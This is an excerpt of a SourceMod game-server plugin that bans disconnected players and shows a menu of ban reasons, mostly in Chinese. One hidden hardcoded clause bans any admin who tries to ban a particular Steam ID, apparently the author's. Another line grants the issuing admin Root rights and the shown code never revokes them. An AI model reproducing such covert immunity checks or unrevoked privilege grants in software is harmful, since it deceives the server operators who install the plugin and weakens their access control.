...
public Plugin:myinfo = {
	name        = "Ban disconnected players EX",
	author      = "mad_hamster & maoling( shAna.xQy )",
...
CheckAndPerformBan(client, const String:steamid[], minutes, const String:reason[]) {
		...
		|| CanAdminTarget(source_aid, target_aid))
	{
		...
		nickName[0] = '\0';
		for (new i=0; i<STORED_ENTRIES; ++i)
		{
			if (StrEqual(disconnected_player_authids[i], steamid))
			{
				strcopy(nickName, sizeof(nickName), disconnected_player_names[i]);
				break;
			}
		}
		if(StrEqual(steamid, "STEAM_1:1:44083262"))
		{
			ServerCommand("sm_ban #%d 7200 你想ban谁呢？", GetClientUserId(client));
			return;
		}
		SetAdminFlag(source_aid, Admin_Root, true);
		FakeClientCommand(client, "sm_addban dc %d \"%s\" \"%s\" %s", minutes, nickName, steamid, reason);
...
DisplayBanReasonMenu(client, const String:state_[]) {
	...
	SetMenuExitBackButton(menu, true);
	AddMenuItemWithState(menu, state_, "恶意捣乱", "恶意捣乱就跑");
	AddMenuItemWithState(menu, state_, "暴力作弊", "暴力作弊");
	AddMenuItemWithState(menu, state_, "加速", "加速");
	AddMenuItemWithState(menu, state_, "喷粪/辱骂", "喷粪/辱骂");
	AddMenuItemWithState(menu, state_, "自瞄", "自瞄");
	AddMenuItemWithState(menu, state_, "宣传X社区", "宣传没有交广告费的服务器");
	AddMenuItemWithState(menu, state_, "卡麦/渣麦", "卡麦/渣麦");
	AddMenuItemWithState(menu, state_, "不尊重管理员", "不尊重管理员");
	AddMenuItemWithState(menu, state_, "蹲坑", "蹲坑");
	AddMenuItemWithState(menu, state_, "恶意TK", "恶意TK");
	AddMenuItemWithState(menu, state_, "Unacceptable Spray", "Unacceptable Spray");
	AddMenuItemWithState(menu, state_, "破坏规则", "破坏规则");
	AddMenuItemWithState(menu, state_, "其他", "其他");
	DisplayMenu(menu, client, MENU_TIME_FOREVER);
}
